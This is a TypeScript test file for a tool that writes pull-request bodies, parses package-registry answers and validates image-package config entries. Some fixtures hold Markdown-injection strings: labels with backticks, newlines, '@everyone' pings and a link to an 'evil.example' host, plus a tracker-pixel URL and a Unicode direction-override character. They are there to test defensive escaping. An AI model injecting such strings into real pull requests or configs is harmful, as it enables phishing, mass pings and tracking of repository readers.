  it('returns one-line code spans from pullRequestBody when a label has backticks, newlines and Markdown', () => {
    const body = pullRequestBody({
      packageName: 'image-ow', version: '1.1.0', added: [], removed: [], newAliases: [], shapes: [], removedLockEntries: [],
      relabelled: [{id: 'image-ow-a.webp', before: 'A', after: 'x`\n## @everyone [click](https://evil.example)'}],
    });
    expect(body).toContain('`image-ow-a.webp`: `A` → `x ## @everyone [click](https://evil.example)`');
    expect(body).not.toContain('\n## @everyone');
  });

  it('returns removed and changed categories in code spans from pullRequestBody when tag texts have Markdown', () => {
    const body = pullRequestBody({
      packageName: 'image-ow', version: '1.1.0', added: [], removed: [], relabelled: [], newAliases: [], shapes: [], removedLockEntries: [],
      retagged: [{id: 'image-ow-a.webp', before: ['old'], after: []}],
      tagChanges: [
        {tag: 'old', kind: 'removed', title: 'Old'},
        {tag: 'roles', kind: 'changed', fields: [{key: 'category', before: 'general', after: 'role'}, {key: 'shape', before: undefined, after: 'portrait'}]},
        {tag: 'x', kind: 'added', title: 'X`\n# @everyone'},
      ],
    });
    expect(body).toContain('- `image-ow-a.webp`: `old` → none');
    expect(body).toContain('- `old`: removed (was `Old`)');
    expect(body).toContain('- `roles`: category `general` → `role`; shape none → `portrait`');
    expect(body).toContain('- `x`: new, `X # @everyone`');
    expect(body).not.toContain('\n# @everyone');
  });
});

describe('parseRegistry', () => {
  it('returns integrity, scripts, bin, dependencies and gypfile when the answer is an object or a bare integrity', () => {
    expect(parseRegistry(JSON.stringify({'dist.integrity': INTEGRITY('a'), scripts: {test: 'jest'}, dependencies: {'@inquirer/prompts': '^5.1.2'}}))).toEqual({
      integrity: INTEGRITY('a'), scripts: {test: 'jest'}, bin: undefined, dependencies: {'@inquirer/prompts': '^5.1.2'}, gypfile: false,
    });
    expect(parseRegistry(JSON.stringify(INTEGRITY('b'))).integrity).toBe(INTEGRITY('b'));
  });

  it.each([
    ['an array', '[]', 'not an object'],
    ['a number', '42', 'not an object'],
    ['a sha1 integrity', JSON.stringify({'dist.integrity': 'sha1-abc'}), 'no sha512 dist.integrity'],
    ['scripts that are not text', JSON.stringify({'dist.integrity': INTEGRITY('a'), scripts: {postinstall: {cmd: 'x'}}}), 'malformed scripts'],
    ['dependencies that are not text', JSON.stringify({'dist.integrity': INTEGRITY('a'), dependencies: {x: 1}}), 'malformed dependencies'],
    ['a gypfile that is not a boolean', JSON.stringify({'dist.integrity': INTEGRITY('a'), gypfile: 'yes'}), 'malformed gypfile'],
    ['a malformed bin', JSON.stringify({'dist.integrity': INTEGRITY('a'), bin: 3}), 'malformed bin'],
  ])('throws when the answer is %s', (_name, text, message) => {
    expect(() => parseRegistry(text)).toThrow(message);
  });
});

describe('pullRequestBody with labels', () => {
  const report = (relabelled: object[], added: object[] = []) => ({
    packageName: 'image-ow', version: '1.1.0', added, removed: [], newAliases: [], shapes: [], removedLockEntries: [], relabelled,
  });

  it('returns the exact escaped forms when two labels look the same in code spans', () => {
    const body = pullRequestBody(report([{id: 'image-ow-a.webp', before: 'A B', after: 'A  B'}, {id: 'image-ow-b.webp', before: 'A`B', after: 'A B'}]));
    expect(body).toContain('- `image-ow-a.webp`: `A B` → `A B` (exact: `"A B"` → `"A\\u0020\\u0020B"`)');
    expect(body).toContain('- `image-ow-b.webp`: `A B` → `A B` (exact: `"A\\u0060B"` → `"A B"`)');
  });

  it('returns no exact form when a label change is plain ASCII', () => {
    const body = pullRequestBody(report([{id: 'image-ow-a.webp', before: 'Mei', after: 'Mei-Ling'}], [{id: 'image-ow-b.webp', label: 'Kiriko'}]));
    expect(body).toContain('- `image-ow-a.webp`: `Mei` → `Mei-Ling`\n');
    expect(body).toContain('- `image-ow-b.webp`: `Kiriko`\n');
  });

  it('returns the whole exact form when a text has the longest length the gate accepts', () => {
    const before = '😀'.repeat(200);
    const after = `${'😀'.repeat(199)}😁`;
    const body = pullRequestBody({...report([]), tagChanges: [{tag: 'h_all', kind: 'changed', fields: [{key: 'title', before, after}]}]});
    expect(body).toContain(escapedText(before));
    expect(body).toContain(escapedText(after));
    expect(body).not.toContain('first difference');
  });

  it('returns the position of the first difference when the texts are longer than the gate accepts', () => {
    const before = '😀'.repeat(300);
    const after = `${'😀'.repeat(299)}😁`;
    const body = pullRequestBody(report([{id: 'image-ow-a.webp', before, after}]));
    expect(body).not.toContain(escapedText(after));
    expect(body).toContain('; first difference at character 300)');
  });

  it('returns unicode escapes from escapedText when a character is outside printable ASCII', () => {
    expect(escapedText('Torbjörn')).toBe('"Torbj\\u00f6rn"');
    expect(escapedText('\u202Eabc\u200B')).toBe('"\\u202eabc\\u200b"');
    expect(escapedText('😀')).toBe('"\\ud83d\\ude00"');
  });
});

describe('checkPackageEntry', () => {
  type Config = {packages: Record<string, unknown>};
  const official = Object.entries(customConfig.packages).filter(([, custom]) => !('legacy' in custom));

  it('writes no error when the entry is one that prepareImages wrote for an official set', () => {
    expect(official.map(([name]) => name).sort()).toEqual(['image-overwatch', 'image-reachthefinals']);
    for (const [name] of official) {
      const tags = Object.keys(((imagesetConfig as Config).packages[name] as {tags: object}).tags);
      expect(tags.length, name).toBeGreaterThan(0);
      expect(tags.filter((tag) => !TAG_NAME.test(tag) || ['all', '__proto__', 'constructor', 'prototype'].includes(tag)), name).toEqual([]);
    }
    for (const [name, custom] of official) {
      const errors: string[] = [];
      checkPackageEntry(name, (imagesetConfig as Config).packages[name], custom, errors);
      expect(errors, name).toEqual([]);
    }
  });

  it('writes a displayName, googleFont and backgroundImage error when they differ from imageset.custom.json', () => {
    const [name, custom] = official[0];
    const entry = structuredClone((imagesetConfig as Config).packages[name]) as Record<string, unknown>;
    entry.displayName = 'Renamed';
    entry.googleFont = 'Comic Neue';
    entry.backgroundImage = 'https://tracker.example/p.gif';
    const errors: string[] = [];
    checkPackageEntry(name, entry, custom, errors);
    expect(errors.map((error) => error.split(':')[2]?.trim().split(' ')[0])).toEqual(['displayName', 'googleFont', 'backgroundImage']);
  });

  it('writes no error when the displayName is the package name and imageset.custom.json has none', () => {
    const entry = {displayName: 'image-new', images: [{filename: 'a.webp', label: 'A', tags: ['everything']}], tags: {everything: {title: 'All', description: 'All', category: 'general'}}};
    const errors: string[] = [];
    checkPackageEntry('image-new', entry, {}, errors);
    expect(errors).toEqual([]);
    checkPackageEntry('image-new', {...entry, googleFont: 'Saira'}, {}, errors);
    expect(errors).toEqual(['imageset.config.json: image-new: googleFont is "Saira", but imageset.custom.json at HEAD gives nothing.']);
  });
});
